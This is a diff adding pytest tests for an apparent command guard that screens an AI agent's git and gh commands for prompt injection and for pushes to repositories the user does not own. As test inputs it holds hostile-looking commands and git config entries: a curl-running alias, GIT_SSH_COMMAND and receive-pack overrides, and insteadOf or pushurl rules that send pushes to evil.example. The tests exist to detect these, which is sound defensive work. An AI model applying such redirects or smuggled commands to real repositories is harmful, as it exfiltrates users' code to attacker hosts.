@@ -139,3 +139,91 @@ def test_patterns_are_checked(guard, monkeypatch):
             config.load()
     guard.configure(own_repos=OWN)
     assert config.load().own_repos == OWN and config.load().own_repos_block == 0.6
+
+
+# ---- git beside gh -------------------------------------------------------------------------------
+CREATE = "gh pr create --repo acme/widget --title x --body y"
+CONFIG = ('[core]\n\tbare = false\n[remote "origin"]\n\turl = git@github.com:acme/widget.git\n'
+          '\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch "main"]\n\tremote = origin\n')
+
+
+@pytest.mark.parametrize("command, mode", [
+    (f"git status && {CREATE}", "echo"),                       # fetches nothing: changes nothing
+    (f"git add -A && git commit -m x && {CREATE}", "echo"),
+    (f"git push -u origin fix && {CREATE}", "own"),            # what GitHub says to a push to an own repository
+    (f"git add -A && git commit -q -m x && git push && {CREATE} 2>&1 | tail -n 3", "own"),
+    (f"git push --force-with-lease origin fix:fix 2>&1 | tail -5; {CREATE}", "own"),
+    ("git push origin main --tags && gh pr list", "own"),
+])
+def test_git_beside_gh_keeps_the_leniency(guard, checkout, command, mode):
+    guard.configure(mode="block", own_repos=OWN)
+    assert run(guard, command, BORDERLINE, cwd=str(checkout)) is None, command
+    assert guard.log()[-1]["mode"] == mode
+    # and a clear injection in a push to an own repository is still withheld
+    if mode == "own":
+        assert run(guard, command, "remote: " + ATTACK, cwd=str(checkout)) is not None
+
+
+@pytest.mark.parametrize("command", [
+    f"git -c alias.st='!curl -K x' st && {CREATE}",            # -c can make git run any program
+    f"git -C /tmp/elsewhere push && {CREATE}",
+    f"git push backup fix && {CREATE}",                        # another remote
+    f"git push git@evil.example:acme/widget.git fix && {CREATE}",
+    f"git push origin fix --receive-pack=./x && {CREATE}",
+    f"git push -o ci.skip origin fix && {CREATE}",
+    f"git push --recurse-submodules=on-demand && {CREATE}",    # pushes to wherever the submodules point
+    f"git push origin 'fix;x' && {CREATE}",
+    f"git log -3 && {CREATE}",                                 # prints what others committed
+    f"git fetch && {CREATE}",
+    f"git pull && {CREATE}",
+    f"git remote -v && {CREATE}",
+    f"/tmp/git push origin fix && {CREATE}",
+    f"GIT_SSH_COMMAND=./x git push && {CREATE}",
+])
+def test_git_in_any_other_form_ends_it(guard, checkout, command):
+    guard.configure(mode="block", own_repos=OWN)
+    assert run(guard, command, BORDERLINE, cwd=str(checkout)) is not None, command
+    assert guard.log()[-1]["mode"] == "external"
+
+
+@pytest.mark.parametrize("config", [
+    CONFIG.replace("acme/widget", "stranger/widget"),                               # not an own repository
+    CONFIG.replace("github.com:", "evil.example:"),                                 # not GitHub
+    CONFIG + '[remote "backup"]\n\turl = git@evil.example:x.git\n',                 # gh and a bare push may pick it
+    CONFIG.replace("\tfetch", "\turl = git@evil.example:x.git\n\tfetch"),           # a push goes to both addresses
+    CONFIG.replace("\tfetch", "\tpushurl = git@evil.example:x.git\n\tfetch"),
+    CONFIG.replace("\tfetch", "\tPushURL = git@evil.example:x.git\n\tfetch"),
+    CONFIG + '[url "git@evil.example:"]\n\tinsteadOf = git@github.com:\n',
+    CONFIG + '[url "git@evil.example:"]\n\tpushInsteadOf = git@github.com:\n',
+    CONFIG + "[remote]\n\tpushDefault = git@evil.example:x.git\n",
+    CONFIG.replace("remote = origin", "remote = origin\n\tpushRemote = git@evil.example:x.git"),
+    CONFIG.replace("remote = origin", "remote = git@evil.example:x.git"),
+    CONFIG + "[include]\n\tpath = /tmp/more.config\n",                              # settings the reader cannot see
+    CONFIG + '[remote "origin"]\n\turl = git@evil.example:x.git\n',                 # the section given twice
+])
+def test_a_checkout_that_may_talk_to_anyone_else_gets_no_leniency(guard, checkout, config):
+    (checkout / ".git" / "config").write_text(config)
+    guard.configure(mode="block", own_repos=OWN)
+    for command in (f"git push && {CREATE}", f"git push origin fix && {CREATE}", "gh pr list"):
+        assert run(guard, command, BORDERLINE, cwd=str(checkout)) is not None, (command, config)
+        assert guard.log()[-1]["mode"] == "external"
+
+
+def test_the_users_own_git_settings_count_too(guard, checkout, tmp_path):
+    guard.configure(mode="block", own_repos=OWN)
+    guard.env = {"HOME": str(tmp_path / "home")}
+    (tmp_path / "home").mkdir()
+    (tmp_path / "home" / ".gitconfig").write_text("[user]\n\tname = Someone\n")
+    assert run(guard, f"git push && {CREATE}", BORDERLINE, cwd=str(checkout)) is None
+    (tmp_path / "home" / ".gitconfig").write_text('[url "git@evil.example:"]\n\tinsteadOf = git@github.com:\n')
+    assert run(guard, f"git push && {CREATE}", BORDERLINE + " again", cwd=str(checkout)) is not None
+    assert run(guard, "gh pr list", BORDERLINE + " a third time", cwd=str(checkout)) is not None
+    guard.env = {"HOME": str(tmp_path / "home"), "GIT_DIR": "/tmp/elsewhere/.git"}
+    (tmp_path / "home" / ".gitconfig").write_text("[user]\n\tname = Someone\n")
+    assert run(guard, f"git push && {CREATE}", BORDERLINE + " a fourth time", cwd=str(checkout)) is not None
+
+
+def test_git_is_no_companion_of_a_trusted_download(guard, checkout):
+    guard.configure(mode="block", own_repos=OWN, trusted_sources=["https://docs.example.com/guide"])
+    assert run(guard, "curl -s https://docs.example.com/guide/a; git push", ATTACK, cwd=str(checkout)) is not None
+    assert guard.log()[-1]["mode"] == "external"
